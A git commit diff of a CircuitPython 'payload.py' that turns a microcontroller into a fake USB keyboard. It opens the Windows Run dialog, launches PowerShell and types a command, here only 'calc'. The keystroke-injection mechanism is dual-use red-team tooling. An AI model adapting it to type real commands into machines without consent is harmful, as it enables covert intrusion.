140042861ad7dab06a58ffd8826581e899383bbe
koll <149805674+michael-koll@users.noreply.github.com>
2025-03-29 15:00:09 +0100

    Update payload.py

--- payload.py
+++ payload.py
@@ -6,32 +6,30 @@ from keycode_win_gr import Keycode
 import board
 import digitalio
 
-# Initialize the keyboard
 kbd = Keyboard(usb_hid.devices)
 layout = KeyboardLayout(kbd)
 
-# Initialize the LED
 led = digitalio.DigitalInOut(board.LED)
 led.direction = digitalio.Direction.OUTPUT
 
 def run_powershell_hidden(command):
-    # Press Windows + R
     kbd.press(Keycode.WINDOWS, Keycode.R)
     kbd.release_all()
-    time.sleep(0.5)
-
-    # Minimal command
-    ps_command = f'powershell -W H -C "{command}"'
-    layout.write(ps_command, delay=0.005)
-    time.sleep(0.02)
-
-    # Press Enter
+    time.sleep(0.2)
+    layout.write('powershell -NoP', delay=0.005)
+    kbd.press(Keycode.ENTER)
+    kbd.release_all()
+    time.sleep(3)
+    layout.write(command, delay=0.005)
+    kbd.press(Keycode.ENTER)
+    kbd.release_all()
+    time.sleep(0.2)
+    layout.write('exit', delay=0.005)
     kbd.press(Keycode.ENTER)
     kbd.release_all()
 
-# Example: Open the calculator
-run_powershell_hidden("calc")
+command = "calc"
+run_powershell_hidden(command)
 
-# Keep the LED on permanently to indicate completion
 while True:
     led.value = True
